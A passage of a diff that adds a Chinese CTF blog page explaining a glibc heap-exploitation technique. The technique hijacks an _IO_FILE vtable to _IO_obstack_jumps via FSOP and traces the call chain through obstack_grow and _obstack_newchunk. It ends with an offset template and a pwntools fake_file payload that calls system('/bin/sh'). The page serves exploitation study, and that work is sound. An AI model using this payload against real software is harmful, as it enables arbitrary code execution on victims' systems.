+</span></span><span class="line"><span class="cl">      <span class="nf">obstack_blank_fast</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Now grow for N bytes, and put the data there.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">obstack_grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">[...]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先获得_IO_obstack_file结构体中的obstack结构体指针作为后面函数运行的参数。然后要绕过<code>fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</code>，执行<code>obstack_blank_fast(obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</code>，而obstack_blank_fast是个宏定义,源码如下：</p>
+<h3 id="obstack_blank_fastobstack_grow">obstack_blank_fast&amp;&amp;obstack_grow
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这对于我们没什么用，然后会执行obstack_grow (obstack, data, n);这个函数，obstack_grow宏定义如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define obstack_grow(OBSTACK, where, length)                      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  __extension__                                   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ({ struct obstack *__o = (OBSTACK);                       \
+</span></span></span><span class="line"><span class="cl"><span class="cp">       int __len = (length);                              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \
+</span></span></span><span class="line"><span class="cl"><span class="cp">     _obstack_newchunk (__o, __len);                      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">       memcpy (__o-&gt;next_free, where, __len);                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">       __o-&gt;next_free += __len;                           \
+</span></span></span><span class="line"><span class="cl"><span class="cp">       (void) 0; })
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，当_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</p>
+<p>时，调用<code>_obstack_newchunk</code>，<code>_obstack_newchunk</code>函数源码如下：、</p>
+<h3 id="_obstack_newchunk">_obstack_newchunk
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_obstack_newchunk</span> <span class="p">(</span><span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">h</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">old_chunk</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">new_chunk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">new_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">obj_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">next_free</span> <span class="o">-</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">already</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Compute size for new chunk.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">new_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">+</span> <span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Allocate and initialize the new chunk.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">new_chunk</span> <span class="o">=</span> <span class="nf">CALL_CHUNKFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[...]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用了<code>new_chunk = CALL_CHUNKFUN (h, new_size);</code>
+CALL_CHUNKFUN是个宏定义，CALL_CHUNKFUN源码如下：</p>
+<h3 id="call_chunkfun">CALL_CHUNKFUN
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># define CALL_CHUNKFUN(h, size) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  (((h)-&gt;use_extra_arg)                               \
+</span></span></span><span class="line"><span class="cl"><span class="cp">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到当<code>((h)-&gt;use_extra_arg</code>不为0时，调用<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p>
+<p>从调用_IO_obstack_xsputn开始分析，假设满足上述所有需要绕过的条件，得以下调用链：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_IO_obstack_xsputn</span>
+</span></span><span class="line"><span class="cl">    <span class="n">obstack_grow</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_obstack_newchunk</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">CALL_CHUNKFUN</span><span class="p">(</span><span class="err">一个宏定义</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                 <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">chunkfun</span><span class="p">)((</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">extra_arg</span><span class="p">,</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果通过FSOP触发的话，我们需要劫持vtable到_IO_obstack_jumps+0x20，由于overflow函数的偏移为0x18,xsputn偏移为0x38,所以执行_IO_flush_all_lockp 时，会执行到_IO_obstack_xsputn，<font style="color:rgb(92, 92, 92);">假设通</font>过exit进行FSOP，得到以下调用链。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">exit</span>
+</span></span><span class="line"><span class="cl"> <span class="n">__run_exit_handlers</span>
+</span></span><span class="line"><span class="cl">   <span class="n">fcloseall</span>
+</span></span><span class="line"><span class="cl">     <span class="n">_IO_cleanup</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_IO_flush_all_lockp</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_IO_obstack_xsputn</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obstack_grow</span>
+</span></span><span class="line"><span class="cl">                <span class="n">_obstack_newchunk</span>
+</span></span><span class="line"><span class="cl">                        <span class="nf">CALL_CHUNKFUN</span><span class="p">(</span><span class="err">一个宏定义</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">chunkfun</span><span class="p">)((</span><span class="n">h</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">extra_arg</span><span class="p">,</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="模板">模板
+</h2><p>当满足以下条件的时候可以实现攻击：利用largebin attack伪造_IO_FILE，记完成伪造的chunk为A</p>
+<ul>
+<li>chunk A内偏移为0xd8处设为_IO_obstack_jumps+0x20 <code>(vtable)</code></li>
+<li>chunk A内偏移为0xe0处设置chunk A的地址作为obstack结构体 <code>(obstack)</code></li>
+<li>chunk A内偏移为0x18处设为1 <code>(next_free)</code></li>
+<li>chunk A内偏移为0x20处设为0 <code>(chunk_limit)</code></li>
+<li>chunk A内偏移为0x48处设为&amp;/bin/sh <code>(extra_arg)</code></li>
+<li>chunk A内偏移为0x38处设为system函数的地址 <code>(chunkfun)</code></li>
+<li>chunk A内偏移为0x28处设为1 <code>(_IO_write_ptr)</code></li>
+<li>chunk A内偏移为0x30处设为0 <code>(_IO_write_end)</code></li>
+<li>chunk A内偏移为0x50处设为1 <code>(use_extra_arg)</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#0x0: b&#34;/bin/sh&#34;, </span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xc8</span><span class="p">:</span> <span class="n">libcbase</span> <span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_obstack_jumps&#39;</span><span class="p">]</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xd0</span><span class="p">:</span> <span class="n">fake_file_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x8</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x10</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x38</span><span class="p">:</span> <span class="n">binsh</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x28</span><span class="p">:</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x18</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x20</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x40</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/house%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/">House系列学习</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-pig/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_pig.png" loading="lazy" data-key="" data-hash="/image/House_of_pig.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of pig</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-botcake/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_botcake.jpg" loading="lazy" data-key="" data-hash="/image/House_of_botcake.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of botcake</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-orangefsop/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_orange.png" loading="lazy" data-key="" data-hash="/image/House_of_orange.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of orange&amp;&amp;FSOP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-husk34c3ctf-readme_revenge/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/husk/House_of_husk.jpg" loading="lazy" data-key="" data-hash="/image/husk/House_of_husk.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of husk&amp;&amp;34c3CTF readme_revenge</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-stormbuu-0ctf_2018_heapstorm2/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_storm.jpg" loading="lazy" data-key="" data-hash="/image/House_of_storm.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of storm&amp;&amp;[BUU] 0ctf_2018_heapstorm2</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 chang
+    </section>
+    
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
